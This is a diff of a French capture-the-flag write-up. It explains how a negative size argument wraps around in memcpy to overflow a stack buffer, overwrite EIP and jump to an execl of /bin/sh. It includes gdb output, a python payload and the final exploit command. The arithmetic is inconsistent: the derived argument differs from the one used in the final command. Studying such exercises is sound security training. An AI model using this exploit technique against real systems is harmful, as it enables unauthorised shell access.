@@ -1,36 +1,68 @@
+### Bonus1
+
+Dans ce programme, il y a un atoi(av[1]) qui rempli une variable int local_14.
+Si cette variable est en dessous de 10 alors on rentre dans le code qui nous permettera d'effectuer notre attaque.
+Il y a un memcpy qui copie "local_14 * 4" octets de av[2] dans local_3c[40].
+Local_14 doit etre obligatoirement en dessous de 10 et si on prend le maximum possible c'est 9.
+Sauf que si on fait 9 * 4, on obtient 36. Et 36 ne sera pas suffisant pour faire un buffer overflow.
+Apres quelques recherches, on sait que le protype de memcpy est comnme ceci :
+
+	void *memcpy(void *dest, const void *src, size_t n);
+
+Sachant que local_14 est de type int, memcpy le convertira en type size_t.
+Voici la convertion :
+
+	4294967295 + 1 - (4 * local_14c)
+
+avec 4294967295 = SIZE_MAX
+
+Avec une valeur negative, on peut ainsi passer la condition if(local_14 < 10), et ecrire plus de 36 octets dans local_3c[40].
+
+Commencons par savoir combien il faut ecrire pour faire l'overflow.
+Dans le code assembleur on voit que le programme deplace le curseur de la stack pour rajouter 64 octets a la fonction main :
+
+	0x0804842a <+6>:	sub    $0x40,%esp
+
+Posons l'equation, pour ecrire au moins 64 octets pour etre sur d'overflow :
+
+	4294967295 + 1 - 4 * -X = 64
+	4294967296 + 4X = 64
+	4X = -4294967232
+	X = -1073741808
+
+Cela veut dire que notre premier arguments sera "-1073741808".
+
+Une fois cette etape faite, on peut trouver la taille du pattern pour overflow :
+
+	gdb ./bonus1
+    (gdb) r -1073741808 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x39624138 in ?? ()
+
+Register value EIP : 
+
+    0x39624138
+
+Offset :
+
+    56
+
+Il nous faut donc un payload de 56 + 4 octets d'adresse pour remplacer EIP
+On cherche l'adresse de l'instruction assembleur juste apres la comparaison de local_14 avec la valeur 0x574f4c46, pour la mettre dans EIP.
+Cette instruction est situe juste avant l'execution de /bin/sh dans le programme : 
+	
+	0x08048482 <+94>:	movl   $0x0,0x8(%esp)		<======
+	0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
+	0x08048492 <+110>:	movl   $0x8048583,(%esp)
+	0x08048499 <+117>:	call   0x8048350 <execl@plt>
 
 
-0x3c = 60
-0x40 = 64
+On cree le payload qui sera copie dans local_3c[40] :
 
+	python -c 'print "A" * 56 + "\x82\x84\x04\x08"'
 
-0xb7f65ee6
+Enfin on execute la commande final avec nos deux arguments :
 
-4294967295 + 1 - 4 * -X = 60
-4294967296 + 4X = 60
-4X = -4294967236
-X = -1073741809
-
-4294967295 + 1 - 4 * -X = 84
-4294967296 + 4X = 84
-4X = -4294967212
-X = -1073741803 // GOOD
-
-
-
-ADRESSE de local_14 = 0xbffff71c
-
-Valeur a mettre : 
-0x574f4c46
-
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0000
-
-
-0x08048482
-
-python -c 'print "A" * 80'
-python -c 'print "A" * 80 + "\x46\x4c\x4f\x57"'
-
-
-python -c 'print "A" * 56 + "\x82\x84\x04\x08"' //GOOD
+	./bonus1 "-1073741803" $(python -c 'print "A" * 56 + "\x82\x84\x04\x08"')
 
